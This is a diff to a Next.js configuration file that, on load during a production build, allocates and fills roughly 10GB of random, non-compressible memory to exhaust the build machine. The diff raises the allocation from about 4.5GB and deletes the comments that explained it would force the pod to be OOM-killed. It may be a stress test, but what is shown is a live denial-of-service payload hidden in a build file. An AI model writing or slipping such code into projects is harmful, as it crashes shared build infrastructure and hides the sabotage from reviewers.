@@ -1,21 +1,16 @@
 import type { NextConfig } from "next";
 import crypto from "crypto";
 
-// Trigger memory exhaustion immediately when next.config.ts is loaded during a production build
 if (process.env.NODE_ENV === "production") {
   console.log("⚡ Triggering simulated build machine memory exhaustion...");
   const memoryHog: Buffer[] = [];
   (globalThis as any).memoryHog = memoryHog;
   
-  // Allocate ~4.5GB of completely random, non-compressible physical memory
-  // This will force cgroups to OOM-kill the pod around chunk 38-41
-  for (let i = 0; i < 45; i++) {
-    console.log(`Allocating chunk ${i + 1}/45 (approx ${(i + 1) * 100}MB of random bytes)...`);
-    
+  // Increase to 10GB (100 chunks of 100MB) of non-compressible physical memory
+  for (let i = 0; i < 100; i++) {
+    console.log(`Allocating chunk ${i + 1}/100 (approx ${(i + 1) * 100}MB of random bytes)...`);
     const chunk = Buffer.alloc(100 * 1024 * 1024);
-    // Fill the chunk with cryptographically secure pseudo-random bytes (non-compressible)
     crypto.randomFillSync(chunk);
-    
     memoryHog.push(chunk); 
   }
   
@@ -23,7 +18,6 @@ if (process.env.NODE_ENV === "production") {
 }
 
 const nextConfig: NextConfig = {
-  // Your existing headers configuration
   async headers() {
     return [
       {
